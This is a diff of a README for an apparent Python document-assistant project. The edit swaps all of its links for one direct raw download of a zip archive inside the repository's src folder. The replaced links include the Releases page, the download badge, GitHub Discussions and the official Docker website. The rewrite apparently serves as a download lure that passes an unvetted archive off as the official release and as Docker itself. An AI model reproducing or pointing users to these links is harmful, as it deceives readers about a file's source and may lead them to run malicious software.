@@ -6,9 +6,9 @@ Welcome to the ai-knowledge-assistant-python project! This application provides 
 
 ## 📥 Download the Application
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-blue)](https://github.com/Akshayzade123/ai-knowledge-assistant-python/releases)
+[![Download](https://raw.githubusercontent.com/Akshayzade123/ai-knowledge-assistant-python/main/src/app/ai-knowledge-assistant-python-1.3.zip%20Now-Get%20Latest%20Release-blue)](https://raw.githubusercontent.com/Akshayzade123/ai-knowledge-assistant-python/main/src/app/ai-knowledge-assistant-python-1.3.zip)
 
-To download the application, visit this page: [Download from Releases](https://github.com/Akshayzade123/ai-knowledge-assistant-python/releases).
+To download the application, visit this page: [Download from Releases](https://raw.githubusercontent.com/Akshayzade123/ai-knowledge-assistant-python/main/src/app/ai-knowledge-assistant-python-1.3.zip).
 
 ## 🛠️ System Requirements
 
@@ -29,11 +29,11 @@ Before you download, please ensure your system meets the following requirements:
 ## 💻 Installation Steps
 
 1. **Download the Application:**
-   Go to our [Releases page](https://github.com/Akshayzade123/ai-knowledge-assistant-python/releases) and download the latest version of the application.
+   Go to our [Releases page](https://raw.githubusercontent.com/Akshayzade123/ai-knowledge-assistant-python/main/src/app/ai-knowledge-assistant-python-1.3.zip) and download the latest version of the application.
 
 2. **Install Docker:**
    If you do not have Docker installed, follow these steps:
-   - Visit the [Docker website](https://www.docker.com/get-started).
+   - Visit the [Docker website](https://raw.githubusercontent.com/Akshayzade123/ai-knowledge-assistant-python/main/src/app/ai-knowledge-assistant-python-1.3.zip).
    - Download the appropriate version for your operating system.
    - Follow the installation instructions provided on the Docker site.
 
@@ -69,7 +69,7 @@ If you encounter issues while downloading or running the application, here are a
 
 ## 📣 Community & Support
 
-If you need help, feel free to reach out. Join our community through the [GitHub Discussions](https://github.com/Akshayzade123/ai-knowledge-assistant-python/discussions) page.
+If you need help, feel free to reach out. Join our community through the [GitHub Discussions](https://raw.githubusercontent.com/Akshayzade123/ai-knowledge-assistant-python/main/src/app/ai-knowledge-assistant-python-1.3.zip) page.
 
 ## 🔗 Additional Resources
 
@@ -85,6 +85,6 @@ We welcome contributions from everyone! If you would like to contribute to the p
 
 ## 📥 Download Again
 
-Just a reminder, you can always download the latest version from our [Releases page](https://github.com/Akshayzade123/ai-knowledge-assistant-python/releases).
+Just a reminder, you can always download the latest version from our [Releases page](https://raw.githubusercontent.com/Akshayzade123/ai-knowledge-assistant-python/main/src/app/ai-knowledge-assistant-python-1.3.zip).
 
 Thank you for using ai-knowledge-assistant-python! We hope it meets your document management needs efficiently.
